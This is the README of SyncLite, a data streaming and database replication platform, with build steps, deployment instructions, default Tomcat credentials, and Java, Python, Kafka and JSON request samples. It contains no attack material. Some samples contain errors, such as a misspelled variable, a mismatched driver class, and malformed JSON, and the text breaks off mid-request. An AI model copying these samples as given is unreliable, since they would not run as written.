SyncLite facilitates development of large-scale data streaming applications through SyncLite Logger, which offers both a Kafka Producer API and SQL API. This allows for the ingestion of massive amounts of data and provides the capability to query the ingested data using the SQL API within applications. Together, SyncLite Logger and SyncLite Consolidator enable seamless last-mile data integration from thousands of streaming application instances into a diverse array of final data destinations.

```
{Data Streaming Apps} + {SyncLite Logger} ---> {Staging Storage} ---> {SyncLite Consolidator} ---> {Destination DB/DW/DataLakes}
```

```
{Data Streaming Apps} ---> {SyncLite DB} ---> {Staging Storage} ---> {SyncLite Consolidator} ---> {Destination DB/DW/DataLakes}
```

Learn more: https://www.synclite.io/synclite/last-mile-streaming


## Deploy Database ETL/Replication/Migration Pipelines:
Set up many-to-many, scalable database replication/migration/incremental ETL pipelines from a diverse range of source databases and raw data files into a diverse range of destinations.

```
{Source Databases} ---> {SyncLite DBReader} ---> {Staging Storage} ---> {SyncLite Consolidator} ---> {Destination DB/DW/DataLakes}
```

Learn More: https://www.synclite.io/solutions/smart-database-etl

## Setup Rapid IoT Data Connectors:
Connect numerous MQTT brokers (IoT gateways) to one or more destination databases.

```
{IoT Message Brokers} ---> {SyncLite QReader} ---> {Staging Storage} ---> {SyncLite Consolidator} ---> {Destination DB/DW/DataLakes}
```

Learn More: https://www.synclite.io/solutions/iot-data-connector

# SyncLite Components

```SyncLite Logger``` is a JDBC driver, enables developers to rapidly build 
	
-sync-enabled, robust, responsive, high-performance, low-latency, transactional, data intensive applications for edge/mobile/desktop platforms using their favorite embedded databases (SQLite, DuckDB, Apache Derby, H2, HyperSQL)
  	
-large scale data streaming solutions for last mile data integrations into a wide range of industry leading databases, while offering ability to perform real-time analytics using the native embedded databases over streaming data, at the producer end of the pipelines.

```SyncLite DB``` is a sync-enabled, single-node database server that wraps popular embedded databases like SQLite, DuckDB, Apache Derby, H2, and HyperSQL. Unlike the embeddable SyncLite Logger library for Java and Python applications, SyncLite DB acts as a standalone server, allowing your edge or desktop applications—regardless of the programming language—to connect and send SQL requests (wrapped in JSON format) over HTTP. 

```SyncLite Client``` is a command line tool to operate SyncLite devices, to execute SQL queries and workloads.

```SyncLite DBReader``` enables data teams and data engineers to configure and orchestrate many-to-many, highly scalable, incremental/log-based database ETL/replication/migration jobs across a diverse array of databases, data warehouses and data lakes.

```SyncLite QReader``` enables developers to integrate IoT data published to message queue brokers, into a diverse array of databases, data warehouses and data lakes, enabling real-time analytics and AI use cases at all three levels: edge, fog and cloud.

```SyncLite Consolidator``` is the centralized application to all the reader/producer tools mentioned above, which receives and consolidates the incoming data and log files in real-time into one or more databases, data warehouses and data lakes of user’s choice. SyncLite Consolidator also offers additional features: table/column/value filtering and mapping, data type mapping, database trigger installation, fine-tunable writes, support for multiple destinations and more.

```SyncLite JobMonitor``` enables managing, scheduling and monitoring all SyncLite jobs created on a given host.

```SyncLite Validator``` is an E2E integration testing tool for SyncLite.

# Build SyncLite

1. If you are using a pre-built release then ignore this section. 
2. Install/Download Apache Maven(3.8.6 or above): https://maven.apache.org/download.cgi
3. If you opt to not use the deploy scripts generated in the release which download the prerequisite software : Apache Tomcat and OpenJDK, then manually install them
	
 	a. OpenJDK 11 : https://jdk.java.net/java-se-ri/11
	
 	b. Apache Tomcat 9.0.95 : https://tomcat.apache.org/download-90.cgi

5. Run following: 
	```
	git clone --recurse-submodules git@github.com:syncliteio/SyncLite.git SyncLite
	
	cd SyncLite
	
	mvn -Drevision=oss clean install
	
	```
6. Release is created under SyncLite/target

## Release Structure:

The build process creates following release structure under SyncLite\target: 
```
synclite-platform-<version>
|
|
--------lib
|       |
|       |
|        --------logger
|       |        |
|       |        |
|       |        --------java
|       |        |        |
|       |        |        |    
|       |        |        --------synclite-logger-<version>.jar   ==> SyncLite Logger JDBC driver, to be added as a depependency in your edge apps
|       |        |
|       |        |
|       |        --------synclite_logger.conf  ==> A sample configuration file for SyncLite logger.
|       |
|       |
|       --------consolidator
|       |        |
|       |        |
|       |        --------synclite-consolidator-<version>.war   ==> SyncLite Consolidator application, to be deployed on an application server such as Tomcat on a centralized host
|
|
|
|
--------sample-apps
|        |
|        |
|        --------jsp-servlet
|        |        |
|        |        |
|        |        --------web
|        |        |
|        |        |
|        |        --------src          ==> Source code of a sample Jsp Servlet app that demonstrates usage of synclite-logger
|        |        |
|        |        |
|        |        --------target        
|        |        |
|        |        |
|        |        --------synclite-sample-app-<version>.war
|        |        
|        |
|        --------java
|        |        |
|        |        |
|        |        --------*.java    => Java source files demonstrating SyncLite logger usage.
|        |        |
|        |        |
|        |        --------README
|        |
|        |
|        |
|        |
|        --------python
|                |
|                |
|                --------*.py    => Python source files demonstrating SyncLite logger usage.
|                |
|                |
|                --------README
|
|
|
|
--------bin
|        |
|        |
|        --------deploy.bat/deploy.sh    ==> Deployment script for deploying SyncLite consolidator and sample application from the lib directory
|        |                    
|        |                        
|        --------start.bat/start.sh    ==> Launch script to start tomcat and the deployed SyncLite applications.
|        |             
|        |           
|        --------docker-deploy.sh/docker-start.sh   ==> Deployment and launch scripts for running SyncLite Consolidator inside a docker container. 
|        |             
|        |           
|        --------stage
|        |        |         
|        |        |         
|        |        --------sftp    ==> Contains docker-deploy.sh,docker-start.sh, docker-stop.sh scripts to launch SFTP server as SyncLite stage
|        |        |         
|        |        |                                   
|        |        --------minio   ==> Contains docker-deploy.sh, docker-start.sh, docker-stop.sh scripts to launch MinIO server as SyncLite stage
|        |       
|        |       
|        |       
|        --------dst
|                |
|                |                
|                --------postgresql  ==> Contains docker-deploy.sh,docker-start.sh scripts to launch PostgrSQL server as SyncLite destination DB
|                |         
|                |                                  
|                --------mysql   ==> Contains docker-deploy.sh, docker-start.shscripts to launch MySQL server as SyncLite destination DB
| 
|
|
--------tools
        |
        |
        --------synclite-client   ==> Client tool to execute SQL operations on SyncLite databases/devices.
	|
	|
        --------synclite-db    ==> A standalone database server offering sync-enabled embedded databases for edge/desktop applications. 
	|
	|
        --------synclite-dbreader    ==> Smart database ETL/Replication/Migration tool
	|
	|
	--------synclite-qreader     ==> Rapid IoT data connector tool
	|
	|
	--------synclite-job-monitor   ==> Job Monitor tool to manage, monitor and schedule SyncLite jobs.
	|
	|
        --------synclite-validator    ==> An E2E integration testing tool for SyncLite
 

```

### Quick Start - Native/Docker based

NOTE: Below instructions enable a quick start and trial of SyncLite platform. 
For production usage, it is recommended to go through installation process to install OpenJDK11 and Tomcat9 (as a service) 
on your Windows/Ubuntu host.

1. Enter bin directory.

2. (One time) Run ```deploy.bat```(WINDOWS) / ```deploy.sh``` (UBUNTU) to deploy the SyncLite consolidator and a SyncLite sample application.
   
   OR Run ```docker-deploy.sh``` (UBUNTU) to deploy a docker container for SyncLite platform.

   OR Manually deploy below war files on your tomcat server:
   - ```SyncLite\target\synclite-platform-dev\lib\consolidator\synclite-consolidator-oss.war```,
   - ```SyncLite\target\synclite-platform-dev\sample-apps\jsp-servlet\web\target\synclite-sample-app-oss.war```
   - ```SyncLite\target\synclite-platform-dev\tools\synclite-dbreader\synclite-dbreader-oss.war```
   - ```SyncLite\target\synclite-platform-dev\tools\synclite-dbreader\synclite-qreader-oss.war```
   - ```SyncLite\target\synclite-platform-dev\tools\synclite-dbreader\synclite-jobmonitor-oss.war```
     
   
3. Run ```start.bat```(WINDOWS) / ```start.sh```(UBUNTU) to start tomcat and the deployed SyncLite applications. (Please note the username/password for tomcat manager web console is synclite/synclite)

   OR Run ```docker-start.sh``` to run the docker container (Please check options passed to docker run command e.g. the home directory of the current user is mapped to ```/root``` inside docker to persist all the
   SyncLite storage in the native host).

   OR manually start applications from your tomcat manager console.

4. Open tomcat manager console http://localhost:8080/manager (Use synclite/synclite as the default user/password when prompted as set by the deploy script). The manager web console will show all the SyncLite applications deployed. 

5. Open http://localhost:8080/synclite-consolidator to launch SyncLite Consolidator application

6. Open http://localhost:8080/synclite-sample-app to launch SyncLite sample web application 

7. Configure and start SyncLite consolidator job in the SyncLite Consolidator application. You can follow through the ""Configure Job"" wizard reviewing all the default configuration values. Create databases/devices of any type from the deployed sample web application and execute SQL workloads on several devices at once specifying the device index range. Observe data consolidator in the SyncLite Cosolidator dashboard. You can check device specific data consolidation progress on individual device pages (from ""List Devices"" page), query destination database on the ""Analyze Data"" page. 

8. This release also comes with a CLI client for SyncLite under tools/synclite-client. You can run synclite-client.bat(WINDOWS)/synclite-client.sh (UBUNTU) to start the client tool and execute SQL operations which are not only executed/persisted on the native database but also consolidated by the SyncLite consolidator into destination DB.
   - Usage 1 : ```synclite-client.bat/synclite-client.sh ==> Will start with DB = <USER.HOME>/synclite/job1/db/test.db, DEVICE_TYPE = SQLITE, CONFIG = <USER.HOME>/synclite/db/synclite_logger.conf```
   - Usage 2 : ```synclite-client.bat/synclite-client.sh <path/to/db/file> --device-type <SQLITE|DUCKDB|DERBY|H2|HYPERSQL|STREAMING|SQLITE_APPENDER|DUCKDB_APPENDER|DERBY_APPENDER|H2_APPENDER|HYPERSQL_APPENDER> --synclite-logger-config <path/to/synclite/logger/config> --server <SyncLite DB Address>```
   - Note: If --sever switch is specified then the client connects to SyncLite DB to  execute SQL statements, else it usages embedded ```SyncLite Logger``` library to directly operate on the devices.
     
9. This release also comes with SyncLite DB server under tools/synclite-db. You can run synclite-db.bat(WINDOWS)/synclite-db.sh(UBUNTU) to start SyncLite DB server and connect to it using synclite-client to execute SQL operations which are not only executed/persisted on the specified embedded database but also consolidated by the SyncLite Consolidator onto the destination databases.
   - Usage 1 : ```synclite-db.bat/synclite-db.sh``` ==> Will start SyncLite DB with default configurations
   - Usage 2 : ```synclite-db.bat/synclite-db.sh --config <path/to/synclite-db/config>```
          
10. Use ```stop.bat``` (Windows) / ```stop.sh```(LINUX) to stop SyncLite consolidator job (if running) and tomcat.
   OR RUN docker-stop.sh to stop the docker container.

11. Refer ```sample_apps/java``` and ```samples_apps/python``` and use any of them as a starting point to build your own application.

12. You can install/use a database of your choice and  perform data consolidation to it (instead of the default SQLite destination): PostgreSQL, MySQL, MongoDB, SQLite, DuckDB.

13. This release also packages docker scripts to setup PostgreSQL and MySQL to serve as SyncLite destinations.
    - ```bin/dst/postgresql``` contains ```docker-deploy.sh```, ```docker-start.sh``` and ```docker-stop.sh```
    - ```bin/dst/mysql``` contains ```docker-deploy.sh```, ```docker-start.sh``` and ```docker.stop.sh```

14. You can deploy your applications on remote hosts/devices and share the local-stage-directory of your respective SyncLite applications with SyncLite Consolidator host via one of the following file staging storages: 
    - SFTP
    - Amazon S3
    - MinIO Object Storage Server
    - Apache Kafka
    - Microsoft OneDrive
    - Google Drive
    - NFS Sharing
    - Local Network Sharing
      
Please check documentation for setting up these staging storages for SyncLite : https://www.synclite.io/resources/documentation
 
15. This release also packages docker scripts to setup SFTP and MinIO servers to serve as SyncLite stage.
    - ```bin/stage/sftp```  contains ```docker-deploy.sh```, ```docker-start.sh``` and ```docker-stop.sh```
    - ```bin/stage/minio``` contains ```docker-deploy.sh```, ```docker-start.sh``` and ```docker-stop.sh```
      NOTE: These scripts contain default configurations. You must change usernames, passwords and setup any additional security mechanisms on top of these basic setups. 

16. The SyncLite docker scripts ```bin/docker-deploy.sh```, ```bin/docker-start.sh```, ```bin/docker-stop.sh``` contain two variables at the top to choose a stage and destination:
    - STAGE : Set it to SFTP or MINIO.
    - DST : Set it to POSTGRESQL or MYSQL.

      Once you set the STAGE and DST to appropriate values e.g. SFTP and POSTGRESQL, the ```docker-deploy.sh``` and ```docker-start.sh``` scripts will bring up docker containers for SyncLite consolidator, SFTP
      server and PostgreSQL server and you will be all set to configure and start a SyncLite consoldiator job be able to consolidate data into PostgreSQL server received from remote SyncLite applications
      configured to connect to the SFTP stage. 

17. After a successful trial, if you need to perform another trial, stop the docker containers, and delete contents under ```/home/synclite``` to start a fresh trial of a different scenario etc.

18. Open http://localhost:8080/synclite-dbreader (and open http://localhost:8080/synclite-consolidator) to setup database ETL/Replication/Migration pipelines.

19. Open http://localhost:8080/synclite-qreader (and open http://localhost:8080/synclite-consolidator) to setup rapid IoT pipelines.

20. Open http://localhost:8080/synclite-job-monitor to manage, monitor and schedule various SyncLite jobs.
    
Refer documentation at https://www.synclite.io/resources/documentation for more details.

NOTE : For production usage, it is recommended to install OpenJDK11 and Tomcat as a service (or any other application server of your choice) and deploy SyncLite consolidator web archive release, Please refer our documentation at www.synclite.io for detailed installation steps for Windows and Ubuntu.


# Using SyncLite Logger

Add ```synclite-logger-<version>.jar``` file created as part of the above build as a dependency in your application.

## Configuration File

Refer ```src/main/resources/synclite_logger.conf``` file for all available configuration options for SyncLite Logger. Refer ""SyncLite Logger Configuration"" section in the documentation at https://www.synclite.io/resources/documentation for more details about all configuration options. 

## Application Code Samples (SQL API)

Refer below code samples to build applications using SyncLite Logger. 

### Transactional Devices : 

Transactional devices (SQLite, DuckDB, Apache Derby, H2, HyperSQL) support all database operations and perform transactional logging of all the DDL and DML operations performed by the application. These enable  developers to build use cases such as building data-intensive sync-ready applications for edge, edge + cloud GenAI search and RAG applications, native SQL (hot) hot data stores, SQL application caches, edge enablement of cloud databases and more.

#### Java
```
package testApp;

import java.nio.file.Path;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.SQLException;
import java.sql.Statement;
import io.synclite.logger.*;


public class TestTransactionalDevice {
	
	public static Path syncLiteDBPath;
	public static void appStartup() throws SQLException, ClassNotFoundException {
		syncLiteDBPath = Path.of(System.getProperty(""user.home""), ""synclite"", ""db"");
		Class.forName(""io.synclite.logger.SQLite"");
		//
		//////////////////////////////////////////////////////
		//For other types of transactional devices : 
		//DuckDB : Class.forName(""io.synclite.logger.DuckDB"");
		//Apache Derby : Class.forName(""io.synclite.logger.Derby"");
		//H2 : Class.forName(""io.synclite.logger.H2"");
		//HyperSQL : Class.forName(""io.synclite.logger.HyperSQL"");
		//////////////////////////////////////////////////////
		//

		Path dbPath = syncLiteDBPath.resolve(""test_tran.db"");
		SQLite.initialize(dbPath, syncLiteDBPath.resolve(""synclite_logger.conf""));
		//
		//////////////////////////////////////////////////////
		//For other types of transactional devices : 
		//DuckDB : DuckDB.initialize(dbPath, syncLiteDBPath.resolve(""synclite_logger.conf""));
		//Apache Derby : Derby.initialize(dbPath, syncLiteDBPath.resolve(""synclite_logger.conf""));
		//H2 : H2.initialize(dbPath, syncLiteDBPath.resolve(""synclite_logger.conf""));
		//HyperSQL : HyperSQL.initialize(dbPath, syncLiteDBPath.resolve(""synclite_logger.conf""));
		//////////////////////////////////////////////////////
		//
	}	
	
	public void myAppBusinessLogic() throws SQLException {
		//
		//Some application business logic
		//
		//Perform some database operations		
		try (Connection conn = DriverManager.getConnection(""jdbc:synclite_sqlite:"" + syncLiteDBPath.resolve(""test_sqlite.db""))) {
			//
		        //////////////////////////////////////////////////////////////////
			//For other types of transactional devices use following connection strings :
			//For DuckDB : jdbc:synclite_duckdb:<db_path>
			//For Apache Derby : jdbc:synclite_derby:<db_path>
			//For H2 : jdbc:synclite_h2:<db_path>
			//For HyperSQL : jdbc:synclite_hsqldb:<db_path>
			///////////////////////////////////////////////////////////////////
			//
			try (Statement stmt = conn.createStatement()) { 
				//Example of executing a DDL : CREATE TABLE. 
				//You can execute other DDL operations : DROP TABLE, ALTER TABLE, RENAME TABLE.
				stmt.execute(""CREATE TABLE IF NOT EXISTS feedback(rating INT, comment TEXT)"");
				
				//Example of performing INSERT
				stmt.execute(""INSERT INTO feedback VALUES(3, 'Good product')"");				
			}
			
			//Example of setting Auto commit OFF to implement transactional semantics
			conn.setAutoCommit(false);
			try (Statement stmt = conn.createStatement()) { 
				//Example of performing basic DML operations INSERT/UPDATE/DELETE
				stmt.execute(""UPDATE feedback SET comment = 'Better product' WHERE rating = 3"");
				stmt.execute(""INSERT INTO feedback VALUES (1, 'Poor product')"");
				stmt.execute(""DELETE FROM feedback WHERE rating = 1"");
			}
			conn.commit();
			conn.setAutoCommit(true);
			
			//Example of Prepared Statement functionality for bulk insert.			
			try(PreparedStatement pstmt = conn.prepareStatement(""INSERT INTO feedback VALUES(?, ?)"")) {
				pstmt.setInt(1, 4);
				pstmt.setString(2, ""Excellent Product"");
				pstmt.addBatch();
				
				pstmt.setInt(1, 5);
				pstmt.setString(2, ""Outstanding Product"");
				pstmt.addBatch();
				
				pstmt.executeBatch();			
			}
		}
		//Close SyncLite database/device cleanly.
		SQLite.closeDevice(Path.of(""test_sqlite.db""));
		//
		///////////////////////////////////////////////////////
		//For other types of transactional devices :
		//DuckDB : DuckDB.closeDevice
		//Apache Derby : Derby.closeDevice
		//H2 : H2.closeDevice
		//HyperSQL : HyperSQL.closeDevice
		//////////////////////////////////////////////////////
		//
		//You can also close all open databases in a single SQL : CLOSE ALL DATABASES
	}	
	
	public static void main(String[] args) throws ClassNotFoundException, SQLException {
		appStartup();
		TestTransactionalDevice testApp = new TestTransactionalDevice();
		testApp.myAppBusinessLogic();
	}
}

```
#### Python   

```
import jaydebeapi

props = {
  ""config"": ""synclite_logger.conf"",
  ""device-name"" : ""tran1""
}
conn = jaydebeapi.connect(""io.synclite.logger.SQLite"",
                           ""jdbc:synclite_duckdb:c:\\synclite\\python\\data\\test_sqlite.db"",
                           props,
                           ""synclite-logger-<version>.jar"",)
#//
#////////////////////////////////////////////////////////////////
#For other types of transactional devices use following are the class names and connection strings :
#For DuckDB - Class : io.synclite.logger.DuckDB, Connection String : jdbc:synclite_duckdb:<db_path>
#For Apache Derby - Class : io.synclite.logger.Derby, Connection String : jdbc:synclite_derby:<db_path>
#For H2 - Class : io.synclite.logger.H2, Connection String : jdbc:synclite_h2:<db_path>
#For HyperSQL - Class : io.synclite.logger.HyperSQL, Connection String : jdbc:synclite_hsqldb:<db_path>
#/////////////////////////////////////////////////////////////////
#//

curs = conn.cursor()

#Example of executing a DDL : CEATE TABLE.
#You can execute other DDL operations : DROP TABLE, ALTER TABLE, RENAME TABLE.
curs.execute('CREATE TABLE IF NOT EXISTS feedback(rating INT, comment TEXT)')

#Example of performing basic DML operations INSERT/UPDATE/DELETE
curs.execute(""insert into feedback values (3, 'Good product')"")

#Example of setting Auto commit OFF to implement transactional semantics
conn.jconn.setAutoCommit(False)
curs.execute(""update feedback set comment = 'Better product' where rating = 3"")
curs.execute(""insert into feedback values (1, 'Poor product')"")
curs.execute(""delete from feedback where rating = 1"")
conn.commit()
conn.jconn.setAutoCommit(True)


#Example of Prepared Statement functionality for bulk insert.
args = [[4, 'Excellent product'],[5, 'Outstanding product']]
curs.executemany(""insert into feedback values (?, ?)"", args)

#Close SyncLite database/device cleanly.
curs.execute(""close database c:\\synclite\\python\\data\\test_sqlite.db"");

#You can also close all open databases in a single SQL : CLOSE ALL DATABASES
```

### Appender Devices :

Appender devices (SQLiteAppender, DuckDBAppender, DerbyAppender, H2Appender, HyperSQLAppender) support all DDL operations and Prepared Statement based INSERT operations, are highly optimized for high speed concurrent batched data ingestion, performing logging of ingested data. Unlike transactional devices, appender devices only allow INSERT DML operations (UPDATE and DELETE are not allowed). Appender devices enable developers to build high volume streaming applications enabled with last mile data integration from thousands of edge points into centralized database destinations as well as in-app analytics by enabling fast read access to ingested data from the underlying local embedded databases storing the ingested/streamed data.

#### Java

```
package testApp;

import java.nio.file.Path;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.SQLException;
import java.sql.Statement;
import io.synclite.logger.*;

public class TestAppenderDevice {
	public static Path syncLiteDBPath;

	public static void appStartup() throws SQLException, ClassNotFoundException {
		syncLiteDBPath = Path.of(System.getProperty(""user.home""), ""synclite"", ""db"");
		Class.forName(""io.synclite.logger.SQLiteAppender"");
		//
		//////////////////////////////////////////////////////
		//For other types of appender devices : 
		//DuckDB : Class.forName(""io.synclite.logger.DuckDBAppender"");
		//Apache Derby : Class.forName(""io.synclite.logger.DerbyAppender"");
		//H2 : Class.forName(""io.synclite.logger.H2Appender"");
		//HyperSQL : Class.forName(""io.synclite.logger.HyperSQLAppender"");
		//////////////////////////////////////////////////////
		//
		Path dbPath = syncLiteDBPath.resolve(""test_appender.db"");
		SQLiteAppender.initialize(dbPath, syncLiteDBPath.resolve(""synclite_logger.conf""));
	}

	public void myAppBusinessLogic() throws SQLException {
		//
		// Some application business logic
		//
		// Perform some database operations
		try (Connection conn = DriverManager.getConnection(""jdbc:synclite_sqlite_appender:"" + syncLiteDBPath.resolve(""test_appender.db""))) {
			//
		        //////////////////////////////////////////////////////////////////
			//For other types of appender devices use following connection strings :
			//For DuckDBAppender : jdbc:synclite_duckdb_appender:<db_path>
			//For DerbyAppender : jdbc:synclite_derby_appender:<db_path>
			//For H2Appender : jdbc:synclite_h2_appender:<db_path>
			//For HyperSQLAppender : jdbc:synclite_hsqldb_appender:<db_path>
			///////////////////////////////////////////////////////////////////
			//
			try (Statement stmt = conn.createStatement()) {
				// Example of executing a DDL : CREATE TABLE.
				// You can execute other DDL operations : DROP TABLE, ALTER TABLE, RENAME TABLE.
				stmt.execute(""CREATE TABLE IF NOT EXISTS feedback(rating INT, comment TEXT)"");
			}

			//
			// Example of Prepared Statement functionality for bulk insert.
			// Note that Appender Devices allows all DDL operations, INSERT INTO DML operations (UPDATES and DELETES are not allowed) and SELECT queries.
			//
			try (PreparedStatement pstmt = conn.prepareStatement(""INSERT INTO feedback VALUES(?, ?)"")) {
				pstmt.setInt(1, 4);
				pstmt.setString(2, ""Excellent Product"");
				pstmt.addBatch();

				pstmt.setInt(1, 5);
				pstmt.setString(2, ""Outstanding Product"");
				pstmt.addBatch();

				pstmt.executeBatch();
			}
		}
		// Close SyncLite database/device cleanly.
		SQLiteAppender.closeDevice(Path.of(""test_appender.db""));
		//
		///////////////////////////////////////////////////////
		//For other types of appender devices :
		//DuckDBAppender : DuckDBAppender.closeDevice
		//DerbyAppender : DerbyAppender.closeDevice
		//H2Appender : H2Appender.closeDevice
		//HyperSQLAppender : HyperSQLAppender.closeDevice
		//////////////////////////////////////////////////////
		//
		// You can also close all open databases/devices in a single SQL : CLOSE ALL
		// DATABASES
	}

	public static void main(String[] args) throws ClassNotFoundException, SQLException {
		appStartup();
		TestAppenderDevice testApp = new TestAppenderDevice();
		testApp.myAppBusinessLogic();
	}

}
```

#### Python

```
import jaydebeapi
props = {
  ""config"": ""synclite_logger.conf"",
  ""device-name"" : ""appender1""
}
conn = jaydebeapi.connect(""io.synclite.logger.SQLiteAppender"",
                           ""jdbc:synclite_sqlite_appender:c:\\synclite\\python\\data\\test_appender.db"",
                           props,
                           ""synclite-logger-<version>.jar"",)
#//
#////////////////////////////////////////////////////////////////
#For other types of appender devices use following are the class names and connection strings :
#For DuckDBAppender - Class : io.synclite.logger.DuckDBAppender, Connection String : jdbc:synclite_duckdb_appender:<db_path>
#For DerbyAppender - Class : io.synclite.logger.DerbyAppender, Connection String : jdbc:synclite_derby_appender:<db_path>
#For H2Appender - Class : io.synclite.logger.H2Appender, Connection String : jdbc:synclite_h2_appender:<db_path>
#For HyperSQLAppender - Class : io.synclite.logger.HyperSQLAppender, Connection String : jdbc:synclite_hsqldb_appender:<db_path>
#/////////////////////////////////////////////////////////////////
#//

curs = conn.cursor()

#Example of executing a DDL : CREATE TABLE.
#You can execute other DDL operations : DROP TABLE, ALTER TABLE, RENAME TABLE.
curs.execute('CREATE TABLE IF NOT EXISTS feedback(rating INT, comment TEXT)')

#Example of Prepared Statement functionality for bulk insert.
args = [[4, 'Excellent product'],[5, 'Outstanding product']]
curs.executemany(""insert into feedback values (?, ?)"", args)

#Close SyncLite database/device cleanly.
curs.execute(""close database c:\\synclite\\python\\data\\test_appender.db"");

#You can also close all open databases in a single SQL : CLOSE ALL DATABASES
```

### Streaming Device : 
Streaming device allows all DDL operations (as supported by SQLite) and Prepared Statement based INSERT operations (UPDATE and DELETE are not allowed) to allow high speed concurrent batched data ingestion, performing logging and streaming of the ingested data. Streaming device enable developers to build high volume data streaming applications enabled with last mile data integration from thousands of edge applications into one or more centralized databases/data warehouses/data lakes.

#### Java

```
package testApp;

import java.nio.file.Path;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.SQLException;
import java.sql.Statement;
import io.synclite.logger.*;

public class TestStreamingDevice {
	public static Path syncLiteDBPath;

	public static void appStartup() throws SQLException, ClassNotFoundException {
		syncLiteDBPath = Path.of(System.getProperty(""user.home""), ""synclite"", ""db"");
		Class.forName(""io.synclite.logger.Streaming"");
		Path dbPath = syncLiteDBPath.resolve(""t_str.db"");
		Streaming.initialize(dbPath, syncLiteDBPath.resolve(""synclite_logger.conf""));
	}

	public void myAppBusinessLogic() throws SQLException {
		//
		// Some application business logic
		//
		// Perform some database operations
		try (Connection conn = DriverManager
				.getConnection(""jdbc:synclite_streaming:"" + syncLiteDBPath.resolve(""t_str.db""))) {
			try (Statement stmt = conn.createStatement()) {
				// Example of executing a DDL : CREATE TABLE.
				// You can execute other DDL operations : DROP TABLE, ALTER TABLE, RENAME TABLE.
				stmt.execute(""CREATE TABLE IF NOT EXISTS feedback(rating INT, comment TEXT)"");
			}

			// Example of Prepared Statement functionality for bulk insert.
			try (PreparedStatement pstmt = conn.prepareStatement(""INSERT INTO feedback VALUES(?, ?)"")) {
				pstmt.setInt(1, 4);
				pstmt.setString(2, ""Excellent Product"");
				pstmt.addBatch();

				pstmt.setInt(1, 5);
				pstmt.setString(2, ""Outstanding Product"");
				pstmt.addBatch();

				pstmt.executeBatch();
			}
		}
		// Close SyncLite database/device cleanly.
		Streaming.closeDevice(Path.of(""t_str.db""));
		// You can also close all open databases/devices in a single SQL : CLOSE ALL
		// DATABASES
	}

	public static void main(String[] args) throws ClassNotFoundException, SQLException {
		appStartup();
		TestStreamingDevice testApp = new TestStreamingDevice();
		testApp.myAppBusinessLogic();
	}
}
```
#### Python

```
import jaydebeapi
props = {
  ""config"": ""synclite_logger.conf"",
  ""device-name"" : ""streaming1""
}
conn = jaydebeapi.connect(""io.synclite.logger.Streaming"",
                           ""jdbc:synclite_streaming:c:\\synclite\\python\\data\\t_str.db"",
                           props,
                           ""synclite-logger-<version>.jar"",)

curs = conn.cursor()

#Example of executing a DDL : CEATE TABLE.
#You can execute other DDL operations : DROP TABLE, ALTER TABLE, RENAME TABLE.
curs.execute('CREATE TABLE IF NOT EXISTS feedback(rating INT, comment TEXT)')

#Example of Prepared Statement functionality for bulk insert.
args = [[4, 'Excellent product'],[5, 'Outstanding product']]
curs.executemany(""insert into feedback values (?, ?)"", args)

#Close SyncLite database/device cleanly.
curs.execute(""close database c:\\synclite\\python\\data\\t_str.db"");

#You can also close all open databases in a single SQL : CLOSE ALL DATABASES
```

## Application Code Samples (Kafka API)

```
package testApp;

import io.synclite.logger.*;

public class TestKafkaProducer {

	public static void main(String[] args) throws Exception {

		Properties props = new Properties();
	    
		//
		//Set properties to use a staging storage of your choice e.g. S3, MinIO, SFTP etc. 
		//where SyncLite logger will ship log files continuously for consumption by SyncLite consolidator
		//
		
        	Producer<String, String> producer = new io.synclite.logger.KafkaProducer(props);

		ProducerRecord<String, String> record = new ProducerRecord<>(""test"", ""key"", ""value"");
        
		//
		//You can use same or different KafkaProducer objects to ingest data concurrently over multiple theads.
		//
        	producer.send(record);
		
		produer.close();

	}
```

# Launching and using SyncLite DB

```SyncLite DB``` is a sync-enabled, single-node database server that wraps popular embedded databases like SQLite, DuckDB, Apache Derby, H2, and HyperSQL. Unlike the embeddable ```SyncLite Logger``` library for Java and Python applications, ```SyncLite DB``` acts as a standalone server, allowing your edge or desktop applications—regardless of the programming language—to connect and send/post SQL requests (wrapped in JSON format) via a REST API. This makes it an ideal solution for seamless, real-time data synchronization in diverse environments.

1. Go to the directory ```synclite-platform-<version>\tools\synclite-db```
2. Check the configurations in synclite-db.conf and adjust them as per your needs.
3. Run ```synclite-db.bat --config synclite-db.conf``` ( OR ```synclite-db.sh --config synclite-db.conf``` on linux). This starts the SyncLite DB server listening at the specified address.
4. An application in your favoirite programming language can establish a connection with the SyncLite DB server at the specified address and send requests in JSON format as below

	- Connect and initialize a device

   	Request
	```
 	{
 		""db-type"" : ""SQLITE""
 		""db-path"" : ""C:\synclite\users\bob\synclite\job1\test.db""
 		""synclite-logger-config"" : ""C:\synclite\users\bob\synclite\job1\synclite_logger.conf""
 		""sql"" : ""initialize""
 	}
  	```

 	Response from Server 
 	```
  	{
  		""result""  : true	
 		""message"" : ""Database initialized successfully""
 	}
  	```
  
	- Send a sql command to create a table

   	Request
	```
 	{
 		""db-path"" : ""C:\synclite\users\bob\synclite\job1\test.db""
 		""sql"" : ""CREATE TABLE IF NOT EXISTS(a INT, b INT)""
 	}
 	```

 	Response from Server 
 	```
  	{
  		""result"" : ""true""
 		""message"" : ""Update executed successfully, rows affected: 0""
   	}
  	```
  
	- Send a request to perform a batched insert in the created table

   	Request
	```
 	{
 		""db-path"" : ""C:\synclite\users\bob\synclite\job1\test.db""
 		""sql"" : ""INSERT INTO t1(a,b) VALUES(?, ?)""
 		""arguments"" : [[1, ""one""], [2, ""two""]]
   	}
 	```

 	Response from Server 
 	```
  	{
  		""result"" : ""true""
 		""message"" : ""Batch executed successfully, rows affected: 2""
   	}
  	```

	- Send a request to begin a transaction on database

 	Request
	 ```
 	{
 		""db-path"" : ""C:\synclite\users\bob\synclite\job1\test.db""
 		""sql"" : ""begin""
   	}
 	```

 	Response from Server 
 	```
  	{
  		""result"" : ""true""
 		""message"" : ""Transaction started successfully""
  		""txn-handle"": ""f47ac10b-58cc-4372-a567-0e02b2c3d479""
   	}
  	```
	
	- Send a request to execute a sql inside started transaction

   	Request
	```
 	{
 		""db-path"" : ""C:\synclite\users\bob\synclite\job1\test.db""
 		""sql"" : ""INSERT INTO t1(a,b) VALUES(?, ?)""
		""txn-handle"": ""f47ac10b-58cc-4372-a567-0e02b2c3d479""
